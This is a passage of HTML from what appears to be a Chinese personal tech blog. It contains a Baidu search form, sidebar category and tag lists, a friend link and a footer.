    id="searchForm"
    method="GET"
    action="https://www.baidu.com/s"
    ectype="application/x-www-form-urlencoded"
    target="_blank"
    autocomplete="false"
    onsubmit="javascript: return false;">
    <input
      id="searchKeyword"
      type="text"
      class="form-control"
      placeholder="输入关键字搜索"
      autocomplete="false"
    />
    <input id="searchKeywordHidden" type="hidden" name="wd" />
    <input id="searchButton" class="btn" type="submit" value="搜索" />
  </form>
</div>
    </section>
    

    <section class="widget">
        <h3 class="widget-hd"><strong>文章分类</strong></h3>
        <!-- 文章分类 -->
<ul class="widget-bd">
    
    <li>
        <a href="../../categories/%E4%B8%AD%E9%97%B4%E4%BB%B6/">中间件</a>
        <span class="badge">(3)</span>
    </li>
    
    <li>
        <a href="../../categories/%E7%BC%96%E7%A8%8B/">编程</a>
        <span class="badge">(7)</span>
    </li>
    
    <li>
        <a href="../../categories/%E5%AE%B9%E5%99%A8/">容器</a>
        <span class="badge">(1)</span>
    </li>
    
    <li>
        <a href="../../categories/Linux/">Linux</a>
        <span class="badge">(7)</span>
    </li>
    
    <li>
        <a href="../../categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a>
        <span class="badge">(2)</span>
    </li>
    
    <li>
        <a href="../../categories/%E8%B7%AF%E7%94%B1%E6%8A%80%E6%9C%AF/">路由技术</a>
        <span class="badge">(3)</span>
    </li>
    
    <li>
        <a href="../../categories/%E6%95%85%E9%9A%9C/">故障</a>
        <span class="badge">(1)</span>
    </li>
    
    <li>
        <a href="../../categories/%E8%BF%90%E7%BB%B4/">运维</a>
        <span class="badge">(1)</span>
    </li>
    
</ul>
    </section>

    
    <section class="widget">
        <h3 class="widget-hd"><strong>热门标签</strong></h3>
        <!-- 文章标签 -->
<div class="widget-bd tag-wrap">
  
    <a class="tag-item" href="../../tags/%E5%BF%AB%E6%8D%B7%E9%94%AE/" title="快捷键">快捷键 (6)</a>
  
    <a class="tag-item" href="../../tags/%E9%9A%8F%E7%AC%94/" title="随笔">随笔 (1)</a>
  
    <a class="tag-item" href="../../tags/%E6%91%98%E5%BD%95/" title="摘录">摘录 (1)</a>
  
</div>
    </section>
    

    

    
    <!-- 友情链接 -->
    <section class="widget">
        <h3 class="widget-hd"><strong>友情链接</strong></h3>
        <!-- 文章分类 -->
<ul class="widget-bd">
    
        <li>
            <a href="https://github.com/front-end-pigs/blog" target="_blank" title="Github博客">Github博客</a>
        </li>
    
</ul>
    </section>
    
</aside>
<!-- / 侧栏部分 -->
    </div>

    <!-- 博客底部 -->
    <footer class="footer">
    &copy;
    
        2016-2020
    

    <a href="../../index.html">Jelon Loves You</a>
</footer>
<div class="back-to-top" id="JELON__backToTop" title="返回顶部">返回顶部</div>

    <!--博客js脚本 -->
    <!-- 这里放网站js脚本 -->

<script src="../../js/main.js?v=1593076679007.js"></script>

</body>
</html>